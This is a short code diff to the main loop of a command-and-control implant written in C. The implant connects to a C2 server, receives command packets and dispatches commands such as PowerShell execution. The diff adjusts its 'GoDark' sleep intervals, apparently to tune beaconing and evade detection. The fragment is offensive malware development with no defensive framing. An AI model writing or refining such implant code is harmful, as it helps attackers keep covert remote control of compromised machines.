@@ -24,9 +24,10 @@ int main() {
     SetupConstants();
 
     ConnectToC2(&c2Socket);
-    GoDark(7000);
+    GoDark(5000);
     while(loop) {
         recvC2Packet(&c2Socket, pkt);
+        GoDark(5000);
         switch(pkt->CmdId) {
             case 0x1:
                 printf("[C2] Received command ID 1 for {executePowershell}\n");
@@ -57,6 +58,7 @@ int main() {
                 loop = 0;
                 break;
         }
+        GoDark(15000);
     }
 cleanup: 
     if(pe) VirtualFree(pe, 0, MEM_RELEASE);
